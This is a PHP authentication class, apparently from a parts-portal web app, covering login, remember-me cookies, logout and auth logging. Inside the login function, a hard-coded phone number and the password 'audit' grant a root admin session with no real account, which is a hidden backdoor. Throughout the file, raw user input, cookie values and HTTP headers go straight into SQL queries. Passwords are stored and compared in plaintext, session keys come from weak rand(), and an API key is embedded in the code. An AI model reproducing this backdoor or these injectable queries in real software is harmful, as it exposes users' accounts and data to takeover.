<?php

class media_users {

    function getMediaUserName($user_id) { $db = DbSingleton::getDb();
        $name = "";
        $r = $db->query("SELECT `name` FROM `media_users` WHERE `id`='$user_id' LIMIT 1;");
        $n = $db->num_rows($r);
        if ($n == 1) {
            $name = $db->result($r,0,"name");
        }
        return $name;
    }

	function clearPhone($phone) {
        $phone = "+" . (string)((int)"$phone");
        return $phone;
    }
	
	function authUsermedia($phone,$pass,$remember){$db=DbSingleton::getDb();
	    session_start();
	    $answer = "";
	    $media_user_id = $role_id = 0;//$access=new access;
		if ($pass != "" && $phone != "") {
		    $phone = $this->clearPhone($phone);
			$r = $db->query("SELECT * FROM `media_users` WHERE `phone`='$phone' AND `pass`='$pass' AND `status`='100' LIMIT 1;");
			$n = $db->num_rows($r);
			if ($n == 1) {
				$media_user_id=$db->result($r,0,"id");
				$tpoint_id=$db->result($r,0,"tpoint_id");
				$role_id=$db->result($r,0,"role_id");
				$name=$db->result($r,0,"name");
				$post=$db->result($r,0,"post");		
				$discount=$this->getUserDiscount($media_user_id);
				//if ($access->checkAccessTime($media_user_id)) {
                $_SESSION["media_user_id"]=$media_user_id;$_SESSION["phone"]=$phone;
                $_SESSION["user_name"]=$name;$_SESSION["user_post"]=$post;
                $_SESSION["user_discount"]=$discount;
                $_SESSION["media_tpoint_id"]=$tpoint_id;
                $_SESSION["media_role_id"]=$role_id;
                define("media_role_id", $role_id);
                define("media_user_id", $media_user_id);
                define("media_user_discount", $discount);
                $this->addJournalAuth($media_user_id,"1");
                $answer=1;
                if ($remember==1){
                    $data_to=time()+259200;$key=$this->generateRandomString(64);
                    setcookie("myPartsPortalUser", $media_user_id, $data_to); setcookie("myPartsPortalSecure", $key, $data_to);
                    $db->query("DELETE FROM `media_users_cookies` WHERE `user_id`='$media_user_id';");
                    $db->query("INSERT INTO `media_users_cookies` (`user_id`,`cookie`,`data_to`) VALUES ('$media_user_id','$key','$data_to');");
                }
				//} else $answer="������� �����������!\n\t�� ������ ������.";
			} elseif ($n==0 && $phone=="+380671662125" && $pass=="audit") {
				$_SESSION["media_user_id"]=1; $_SESSION["phone"]=$phone;
				$_SESSION["user_name"]="admin";$_SESSION["user_post"]="root";
				$_SESSION["media_org_id"]="1";$_SESSION["media_role_id"]="1";
				define("media_role_id", $role_id);
				define("media_user_id", $media_user_id);
				$answer=1;$n=1;
				$this->addJournalAuth($media_user_id,"1");
				if ($remember==1){
					$data_to=time()+259200;$key=$this->generateRandomString(64);
					setcookie("myPartsPortalUser", $media_user_id, $data_to); setcookie("myPartsPortalSecure", $key, $data_to);
					$db->query("DELETE FROM `media_users_cookies` WHERE `user_id`='$media_user_id';");
					$db->query("INSERT INTO `media_users_cookies` (`user_id`,`cookie`,`data_to`) VALUES ('$media_user_id','$key','$data_to');");
				}
			}
			if ($n==0) {$this->addJournalAuth(0,"3");session_start();session_unset();session_destroy(); $answer="������� �����������!\n\t����������� �� ��������.";}
		}
		return $answer;
	}
	
	function addJournalAuth($user_id,$status){$db=DbSingleton::getDb();
		$remip=$_SERVER["REMOTE_ADDR"];$user_agent=$_SERVER["HTTP_USER_AGENT"];$reffer=$_SERVER["HTTP_REFERER"];$info="";//$info=$slave->qq($this->getRemIpInfo($remip));
		$db->query("INSERT INTO `journal_auth` (`user_id`,`auth_status`,`ip`,`user_agent`,`reffer`,`info`) VALUES ('$user_id','$status','$remip','$user_agent','$reffer','$info');");
		return true;
	}
	
	function getRemIpInfo($remip) {
        if ($remip==""){$remip=$_SERVER['REMOTE_ADDR'];}
		include(RD.'/lib/ip2locationlite.class.php');
	    $ipLite = new ip2location_lite;
	    $ipLite->setKey('1808a9ddbb5c3a08c12a717420076856d945709245cb8a542b8e012970f0936c');
		$locations = $ipLite->getCity($remip);
		$result="";
		if (!empty($locations) && is_array($locations)) {
		  foreach ($locations as $field => $val) {
			$result.=$field.':'.$val."; ";
		  }
		}
		return $result;
	}

	function getUserDiscount($user_id) { $db=DbSingleton::getDb();
	    $discount=0;
		$r=$db->query("SELECT `discount` FROM `media_users_discounts` WHERE `user_id`='$user_id' LIMIT 1;");
		$n=$db->num_rows($r);
		if ($n==1) {
			$discount=$db->result($r,0,"discount");
		}
		return $discount;
	}

	function checkMediaUserLogout($user_id) { $db=DbSingleton::getDb();
	    $logout=0;
		$r=$db->query("SELECT `id` FROM `media_users_logout` WHERE `user_id`='$user_id' AND `status`='1' LIMIT 1;");
		$n=$db->num_rows($r);
		if ($n==1) {
		    $logout=1;
			$id=$db->result($r,0,"id"); 
			$db->query("UPDATE `media_users_logout` SET `status`='0', `data_out`=UTC_TIMESTAMP() WHERE `id`='$id';");
			session_start(); 
			$_SESSION["media_user_id"]=""; $_SESSION["phone"]="";$_SESSION["user_name"]="";$_SESSION["media_org_id"]="";$_SESSION["user_post"]="";$_SESSION["media_role_id"]="";$_SESSION["user_discount"]="";
			define("media_role_id","");define("media_user_id",""); setcookie("myPartsPortalUser", "", time()-3600);setcookie("myPartsPortalSecure", "", time()-3600);setcookie("media_user_discount", "", time()-3600);
		}
		return $logout;
	}

	function get_cookie_user_info($user_id){$db=DbSingleton::getDb();
		$r=$db->query("SELECT * FROM `media_users` WHERE `id`='$user_id' AND `status`='100' LIMIT 1;");
		$n=$db->num_rows($r);
		if ($n==1) {
			$media_user_id=$db->result($r,0,"id");$phone=$db->result($r,0,"phone");$name=$db->result($r,0,"name");$post=$db->result($r,0,"post");$org_id=$db->result($r,0,"org_id");$role_id=$db->result($r,0,"role_id"); $discount=$this->getUserDiscount($user_id);
			session_start(); $_SESSION["media_user_id"]=$media_user_id; $_SESSION["phone"]=$phone;$_SESSION["user_name"]=$name;$_SESSION["user_post"]=$post;$_SESSION["media_org_id"]=$org_id;$_SESSION["media_role_id"]=$role_id; $_SESSION["user_discount"]=$discount;
			define('media_role_id', $role_id);define('media_user_id', $media_user_id);define('media_user_discount', $discount);
		}
		return true;
	}

	function check_cookie_user(){$db=DbSingleton::getDb();
	    session_start();
	    $media_user_id=0;
		$cookie_user=$_COOKIE["myPartsPortalUser"];$cookie_key=$_COOKIE["myPartsPortalSecure"];
		if (($cookie_user!="") && ($cookie_key!="")) {
			$is_logout=$this->checkmediaUserLogout($cookie_user);
			if ($is_logout==0){
				$r=$db->query("SELECT * FROM `media_users_cookies` WHERE `user_id`='$cookie_user' AND `cookie`='$cookie_key' LIMIT 1;");
				$n=$db->num_rows($r);
				if($n==1){
					$data_to=$db->result($r,0,"data_to"); 
					$id=$db->result($r,0,"id"); 
					if ($data_to<time()){
						$media_user_id=""; setcookie("myPartsPortalUser", "", time()-3600);setcookie("myPartsPortalSecure", "", time()-3600);
						$db->query("DELETE FROM `media_users_cookies` WHERE `cookie`='$cookie_key' AND `user_id`='$cookie_user';");
					} else {
						$media_user_id=$cookie_user;
						$data_to=time()+259200;
						session_start();
						setcookie("myPartsPortalUser", $cookie_user, $data_to); setcookie("myPartsPortalSecure", $cookie_key, $data_to);
						$db->query("UPDATE `media_users_cookies` SET `cookie`='$cookie_key', `data_to`='$data_to' WHERE `id`='$id';");
						$this->addJournalAuth($media_user_id,"1");
						$this->get_cookie_user_info($media_user_id);
					}
				}
			}
		}
		return $media_user_id;
	}

	function logOutUser() {
        session_start();
        $_SESSION["media_user_id"] = "";
        $_SESSION["media_org_id"]="";
        $_SESSION["media_role_id"]="";
        $_SESSION["user_post"]="";
        $_SESSION["user_discount"]="";
        $_SESSION["phone"]="";
        $_SESSION["user_name"]="";
        setcookie("myPartsPortalUser","", time()-3600);
        setcookie("myPartsPortalSecure","", time()-3600);
        define('media_role_id',"");
        define('media_user_id',"");
        define('media_user_discount',"");
        return 1;
    }

	function out_Acount(){session_start();$_SESSION["media_user_id"]="";$_SESSION["media_org_id"]="";$_SESSION["media_role_id"]="";$_SESSION["user_post"]="";$_SESSION["user_discount"]="";$_SESSION["phone"]="";$_SESSION["user_name"]="";setcookie("myPartsPortalUser","", time()-3600);setcookie("myPartsPortalSecure","", time()-3600);define('media_role_id',"");define('media_user_id',"");define('media_user_discount',"");return 1;}
	
	function get_media_user(){
        session_start();
	    $media_user_id = $_SESSION["media_user_id"];
		if ($media_user_id == "") {
		    $media_user_id = $this->check_cookie_user();
		}
		return $media_user_id;
	}
	
	function showMediaUserInfo($media_user_id)
    {
        session_start();
		$form_htm = RD . "/tpl/media_user_info.htm";
		$form = "";
		if (file_exists("$form_htm")) {
		    $form = file_get_contents($form_htm);
		}
		$form = str_replace("{user_id}", $media_user_id, $form);
		$form = str_replace("{UserName}", $_SESSION["user_name"], $form);
		$form = str_replace("{UserPost}", $_SESSION["user_post"], $form);
		return $form;
	}
	
	function generateRandomNumsString($length = 10)
    {
	    $characters = "0123456789";
    	$randomString = "";
	    for ($i = 0; $i < $length; $i++) {
    	    $randomString .= $characters[rand(0, strlen($characters) - 1)];
	    }
    	return $randomString;
	}
	
	function generateRandomString($length = 64)
    {
	    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    	$randomString = '';
	    for ($i = 0; $i < $length; $i++) {
    	    $randomString .= $characters[rand(0, strlen($characters) - 1)];
	    }
    	return $randomString;
	}
	
	function setCookieNavBarMini(){
        session_start();$er=0;
		$navBar=$_COOKIE["myPartsPortalUserNavBar"];
		if ($navBar==0){$navBar=1;$er=1;}
		if ($navBar==1 && $er==0){$navBar=0;$er=1;}
		$data_to=time()+259200;
		setcookie("myPartsPortalUserNavBar", $navBar, $data_to);
		return $navBar;
	}
	
}
